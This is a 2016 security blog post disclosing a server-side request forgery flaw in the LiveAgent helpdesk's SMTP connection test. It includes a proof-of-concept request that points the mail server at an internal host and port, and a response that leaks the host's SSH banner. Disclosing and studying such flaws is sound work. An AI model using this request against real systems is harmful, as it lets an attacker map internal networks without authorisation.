---
layout: post
title: "SSRF in LiveAgent"
thumbnail: periscope-240.jpg
date: 2016-10-05
---

The helpdesk software LiveAgent makes it possible to configure a SMTP server. Since it does not validate the SMTP server parameter and returns the response of the TCP connection, it is vulnerable to server side request forgery.

## Configuring the SMTP server

With LiveAgent it is possible to use your own SMTP server as outgoing mail server. To configure this, you need to enter a host name, port, username, and password. LiveAgent helps the user with debugging any issues by connecting to the server and showing the communication log:

![](/images/ladesk-communication-log-functionality.png)

## Server side request forgery

It is possible to connect to any host on any port and view the resulting communication. This introduces a security vulnerability if there are any hosts that the server can connect to, but the client cannot. For example, other hosts within the same network as the server may be accessible internally, but not from the Internet. Let's try it out by configuring a host on the internal network as SMTP server:

    D={
        "C": "La_Mail_MailAccountSettingsForm",
        "M": "testSmtpConnection",
        "fields": [
            ["name", "value", "values", "error"],
            ["email", "henk@example.com", "", ""],
            ["username", "henk@mailinator.com", "", ""],
            ["password", "henk", "", ""],
            ["smtp_server", "192.168.101.1", "", ""],
            ["smtp_port", "22", "", ""],
            ["useIncomingCredentials", "Y", "", ""]
        ],
        "S": "4916cf1dffaf5641xxxxx5b01c878b8"
    }

This request configures host 192.168.101.1 and port 22 as the SMTP server. The response shows information about the SSH server:

    {
        "F": [
            ["name", "value", "values", "error"],
            ["email", "henk@example.com", "", ""],
            ["username", "henk@mailinator.com", "", ""],
            ["password", "henk", "", ""],
            ["smtp_server", "192.168.101.1", "", ""],
            ["smtp_port", "22", "", ""],
            ["useIncomingCredentials", "Y", "", ""]
            ["communicationLog", "SMTP communication log: 
            2016-07-05-05-58-07-2479 Recv: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2
            2016-07-05-05-58-07-2484 Sent: QUIT
            2016-07-05-05-58-07-2492 Recv: Protocol mismatch
            ", null, ""]
        ],
        "S": "N",
        "M": "Connecting to server failed"
    }

As you can see the server connected to 192.168.101.1 on port 22, and reveals that this host is running OpenSSH 6.7 on Debian.

## Information leakage only

This vulnerability makes it possible to read the response from every port, but we have no control over the data sent. We can use it to obtain information on the network, but we can not send any attacker-controlled data over the network. Nevertheless, this would be a powerful vulnerability if combined for example with a blind SSRF that can only be used to send data.

## Conclusion

Missing validation of the SMTP server parameter makes it possible to connect to hosts on the internal network and read their response on TCP connections.
